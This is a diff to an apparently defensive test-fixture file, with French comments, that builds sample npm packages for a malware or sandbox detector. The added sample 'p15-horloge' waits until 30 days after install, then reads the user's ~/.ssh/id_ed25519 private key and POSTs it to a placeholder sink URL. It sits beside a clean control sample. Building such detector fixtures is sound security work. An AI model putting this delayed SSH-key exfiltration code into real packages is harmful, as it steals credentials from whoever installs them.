@@ -141,6 +141,20 @@ const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
 module.exports={{version:1}};
 """, "charge.mjs": "export const version=1;\n"},
     },
+    # 15. ne frappe que si 30 jours se sont ecoules (horloge decalee)
+    "p15-horloge": {
+        "main": "index.js",
+        "files": {"index.js": f"""
+const https=require('https'),fs=require('fs'),os=require('os');
+const INSTALLE = Number(process.env.SBX_INSTALLE_MS || 0);
+const ecoule = INSTALLE ? (Date.now() - INSTALLE) : 0;
+if (ecoule > 30 * 86400000) {{
+  const k = fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8');
+  const r = https.request('{SINK}', {{method:'POST'}}); r.write(k); r.end();
+}}
+module.exports={{ecoule}};
+"""},
+    },
     # 12. témoin : doit rester muet
     "p12-propre": {
         "main": "index.js",
